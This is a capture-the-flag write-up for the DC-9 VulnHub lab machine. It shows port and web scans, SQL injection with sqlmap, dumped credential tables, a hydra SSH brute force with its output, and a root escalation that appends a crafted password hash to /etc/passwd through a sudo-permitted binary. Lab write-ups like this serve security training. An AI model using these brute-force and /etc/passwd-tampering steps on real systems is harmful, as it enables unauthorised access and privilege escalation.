# BOX NAME: DC-9
**LINK**: https://www.vulnhub.com/entry/dc-9,412/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate the webapp, quickly realize it's sql-injectable. Grabbed all creds, created a quick python script to automate login-validation.
2. Bruteforce gathered credentials on SSH. Log in, find more passwords. Brute force more credentials.
3. Get onto users account with sudo acces to a dev elf binary.
4. Manipulate /etc/passwd
5. sudo as root

I highly like this box. Even though this was on of the easier boxes I feel this is a bit closer to reality than most boxes. Initial foothold via webapp compromise.
Password reuse on other service, many credentials. Find more credentials, go back to step 2. Manipulate dev binary to gain root privs.

Great series, fun challenges.
Big thanks to @DCAU7 and partners.
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.72
[+] URL:	http://dc-9
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ jml-scanner -u 10.77.0.72

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|J|M|L|-|P|O|R|T|S|C|A|N|N|E|R|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

[+] Port 22 is open.
[+] Port 80 is open.

[+] A total of 2 found ports open      
```
```
└─$ nmap -sV -sC $IP -oN nmap-dc9.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 22:31 CEST
Nmap scan report for dc.local (10.77.0.72)
Host is up (0.00029s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2b3387432740bc516dc13decb9b8ac3 (RSA)
|   256 065c93871554686b889155cff89ace40 (ECDSA)
|_  256 e42c88da8863268c93d5f7632ba3ebab (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
http://dc-9/ [200 OK] Apache[2.4.38]
 Country[RESERVED][ZZ]
 HTML5
 HTTPServer[Debian Linux][Apache/2.4.38 (Debian)]
 IP[10.77.0.72]
 Title[Example.com - Staff Details - Welcome]
```

nikto-scan
```
└─$ nikto -h $URL | tee nikto-dc9.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.72
+ Target Hostname:    dc-9
+ Target Port:        80
+ Start Time:         2023-05-04 22:32:12 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /includes/: Directory indexing found.
+ /includes/: This might be interesting.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 7850 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2023-05-04 22:32:41 (GMT2) (29 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing
```
N/A
```
other
```

```
</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1. So first thing I did was fire up sqlmap against the search input field. Got a hit in 2 seconds. Smooth sailing from there.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
/home/janitor/.secrets-for-putin/passwords-found-on-post-it-notes.txt
```

**SUID's**:

```
/usr/lib/openssh/ssh-keysign                                                                                                                                                                                                                
/usr/lib/eject/dmcrypt-get-device                                                                                                                                                                                                           
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                                                                 
/usr/bin/chsh                                                                                                                                                                                                                               
/usr/bin/umount                                                                                                                                                                                                                             
/usr/bin/passwd                                                                                                                                                                                                                             
/usr/bin/gpasswd                                                                                                                                                                                                                            
/usr/bin/sudo                                                                                                                                                                                                                               
/usr/bin/newgrp                                                                                                                                                                                                                             
/usr/bin/chfn                                                                                                                                                                                                                               
/usr/bin/su                                                                                                                                                                                                                                 
/usr/bin/mount 
```
**SGID's**:

```
/usr/sbin/unix_chkpwd                                                                                                                                                                                                                       
/usr/bin/wall                                                                                                                                                                                                                               
/usr/bin/dotlockfile                                                                                                                                                                                                                        
/usr/bin/ssh-agent                                                                                                                                                                                                                          
/usr/bin/expiry                                                                                                                                                                                                                             
/usr/bin/bsd-write                                                                                                                                                                                                                          
/usr/bin/crontab                                                                                                                                                                                                                            
/usr/bin/chage  
```
**OTHERS**:

```

```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```

```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password

admin:transorbital1			[WEB]

marym:3kfs86sfd
julied:468sfdfsd2
fredf:4sfd87sfd1			
fredf:B4-Tru3-001			[SSH]
barneyr:RocksOff
tomc:TC&TheBoyz
jerrym:B8m#48sd
wilmaf:Pebbles
bettyr:BamBam01
chandlerb:UrAG0D
joeyt:Passw0rd				[SSH]
rachelg:yN72#dsd
rossg:ILoveRachel
monicag:3248dsds7s
phoebeb:smellycats
scoots:YR3BVxxxw87
janitor:Ilovepeepee			[SSH]
janitor2:Hawaii-Five-0
admin:transorbital1
```
```
└─$ hydra -C creds.txt $IP ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-04 23:19:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 18 login tries, ~2 tries per task
[DATA] attacking ssh://10.77.0.72:22/
[22][ssh] host: 10.77.0.72   login: janitor   password: Ilovepeepee
[22][ssh] host: 10.77.0.72   login: joeyt   password: Passw0rd
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-04 23:19:21

```
```
marym:x:1001:1001:Mary Moe:/home/marym:/bin/bash
julied:x:1002:1002:Julie Dooley:/home/julied:/bin/bash
fredf:x:1003:1003:Fred Flintstone:/home/fredf:/bin/bash
barneyr:x:1004:1004:Barney Rubble:/home/barneyr:/bin/bash
tomc:x:1005:1005:Tom Cat:/home/tomc:/bin/bash
jerrym:x:1006:1006:Jerry Mouse:/home/jerrym:/bin/bash
wilmaf:x:1007:1007:Wilma Flintstone:/home/wilmaf:/bin/bash
bettyr:x:1008:1008:Betty Rubble:/home/bettyr:/bin/bash
chandlerb:x:1009:1009:Chandler Bing:/home/chandlerb:/bin/bash
joeyt:x:1010:1010:Joey Tribbiani:/home/joeyt:/bin/bash
rachelg:x:1011:1011:Rachel Green:/home/rachelg:/bin/bash
rossg:x:1012:1012:Ross Geller:/home/rossg:/bin/bash
monicag:x:1013:1013:Monica Geller:/home/monicag:/bin/bash
phoebeb:x:1014:1014:Phoebe Buffay:/home/phoebeb:/bin/bash
scoots:x:1015:1015:Scooter McScoots:/home/scoots:/bin/bash
janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash
janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash
``` 

</details>

<details><summary><ins>HASHES:</ins></summary>

```
+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
| id | email                 | phone          | lastname   | reg_date            | firstname | position                      |
+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
| 1  | marym@example.com     | 46478415155456 | Moe        | 2019-05-01 17:32:00 | Mary      | CEO                           |
| 2  | julied@example.com    | 46457131654    | Dooley     | 2019-05-01 17:32:00 | Julie     | Human Resources               |
| 3  | fredf@example.com     | 46415323       | Flintstone | 2019-05-01 17:32:00 | Fred      | Systems Administrator         |
| 4  | barneyr@example.com   | 324643564      | Rubble     | 2019-05-01 17:32:00 | Barney    | Help Desk                     |
| 5  | tomc@example.com      | 802438797      | Cat        | 2019-05-01 17:32:00 | Tom       | Driver                        |
| 6  | jerrym@example.com    | 24342654756    | Mouse      | 2019-05-01 17:32:00 | Jerry     | Stores                        |
| 7  | wilmaf@example.com    | 243457487      | Flintstone | 2019-05-01 17:32:00 | Wilma     | Accounts                      |
| 8  | bettyr@example.com    | 90239724378    | Rubble     | 2019-05-01 17:32:00 | Betty     | Junior Accounts               |
| 9  | chandlerb@example.com | 189024789      | Bing       | 2019-05-01 17:32:00 | Chandler  | President - Sales             |
| 10 | joeyt@example.com     | 232131654      | Tribbiani  | 2019-05-01 17:32:00 | Joey      | Janitor                       |
| 11 | rachelg@example.com   | 823897243978   | Green      | 2019-05-01 17:32:00 | Rachel    | Personal Assistant            |
| 12 | rossg@example.com     | 6549638203     | Geller     | 2019-05-01 17:32:00 | Ross      | Instructor                    |
| 13 | monicag@example.com   | 8092432798     | Geller     | 2019-05-01 17:32:00 | Monica    | Marketing                     |
| 14 | phoebeb@example.com   | 43289079824    | Buffay     | 2019-05-01 17:32:02 | Phoebe    | Assistant Janitor             |
| 15 | scoots@example.com    | 454786464      | McScoots   | 2019-05-01 20:16:33 | Scooter   | Resident Cat                  |
| 16 | janitor@example.com   | 65464646479741 | Trump      | 2019-12-23 03:11:39 | Donald    | Replacement Janitor           |
| 17 | janitor2@example.com  | 47836546413    | Morrison   | 2019-12-24 03:41:04 | Scott     | Assistant Replacement Janitor |
+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+

+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+

+--------+----------------------------------+----------+
| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+

```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
password tampering via sudo permissions on fredf user.

fredf@dc-9:~$ openssl passwd -6 -salt pwnu nuked
fredf@dc-9:~$ $6$pwnu$K.yVRAwKzoM2NaeH30zCCE8CBFXM4YYhHRLLyJPxs8kSy8g6N0zisl1xI2MW7BPs.HAcZ41GSFAmRJ80fdfXS.
fredf@dc-9:~$ echo '$6$pwnu$K.yVRAwKzoM2NaeH30zCCE8CBFXM4YYhHRLLyJPxs8kSy8g6N0zisl1xI2MW7BPs.HAcZ41GSFAmRJ80fdfXS.' >> hash.txt
fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test hash.txt /etc/passwd
fredf@dc-9:~$ su pwnu
Password: 
root@dc-9:/home/fredf# id
uid=0(root) gid=0(root) groups=0(root)
```

```
root@dc-9:/home/fredf# cat /root/theflag.txt 


███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
                                                                             
Congratulations - you have done well to get to this point.

Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
who have taken the time to complete the various DC challenges.

I also want to send out a big thank you to the various members of @m0tl3ycr3w .

They are an inspirational bunch of fellows.

Sure, they might smell a bit, but...just kidding.  :-)

Sadly, all things must come to an end, and this will be the last ever
challenge in the DC series.

So long, and thanks for all the fish.
```

</details>